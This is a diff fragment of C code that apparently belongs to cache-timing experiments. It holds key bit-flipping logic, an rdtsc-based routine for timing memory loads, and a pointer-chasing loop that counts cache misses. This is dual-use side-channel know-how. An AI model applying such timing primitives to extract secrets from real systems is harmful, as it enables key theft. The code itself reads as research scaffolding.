+//printf("%02X", htonl(((int*)tempKey)[charNumber]));
+	tempKey[charNumber] = (tempChar | (tempKey[charNumber] & mask2[bit % 8]));
+
+//for (currChar = 0; currChar < (KEYS_LEN_IN_BITS / BITS_IN_CHAR) / sizeof(int); currChar++)
+//printf("%08x", htonl(((int*)tempKey)[currChar]));
+//printf("\n");
+//scanf("%s",Input);
+	return tempKey;
+
+
+
+}
+
+/*
+inline int MeasureTimeAsm(char* pMem)
+{
+	int Time;
+	asm volatile ("lfence;");
+	asm volatile ("rdtsc;");
+	asm volatile ("movl %eax, %edi;");
+	asm volatile ("movl (%0), %%ebx;" : : "r" (pMem) : "ebx");
+	asm volatile ("lfence;");
+	asm volatile ("rdtsc;");
+	asm volatile ("subl %edi, %eax;");
+	asm volatile ("movl %%eax, %0;" : "=r" (Time));
+	return Time;
+}
+*/
+
+int Temp()
+{
+	double elapsedTime;
+	int i, j;
+	srand (196509312);
+	memset(Space1, 0, sizeof(Space1));
+
+	for (j = 0; j < 3; j++)
+	{
+		int RandLine = 1000;
+		int Misses = 0;
+		int Place = Space1;
+
+		printf("Time %d.\n", j);
+		for (i = 0; i < 50; i++)
+		{
+			if (j == 0)
+			{
+				RandLine = rand() * 64;
+				RandLine %= sizeof(Space1);
+				*((int*)Place) = (Space1 + RandLine);
+				Place = Space1 + RandLine;// + RandPlace;
+			} else
+			{
+				//Place = *((int*)Place);
+			}
+
+			elapsedTime = MeasureTimeAsm(Place);
+			printf("First Time: %lf place %x.\n", elapsedTime, Place);
+
+			if (elapsedTime > 100) {
+				Misses++;
+			}
+		}
+
+		printf("Misses %d\n", Misses);
+	}
+}
+
+const char *buff_to_binary(char* x, int Len, char* Result)
+{
+	Result[0] = '\0';
+
+	int z, i;
+	for (i = 0; i < Len; i++) {
+		for (z = 128; z > 0; z >>= 1)
+		{
+			strcat(Result, ((*(x + i) & z) == z) ? "1" : "0");
+		}
+	}
+
+	return Result;
+}
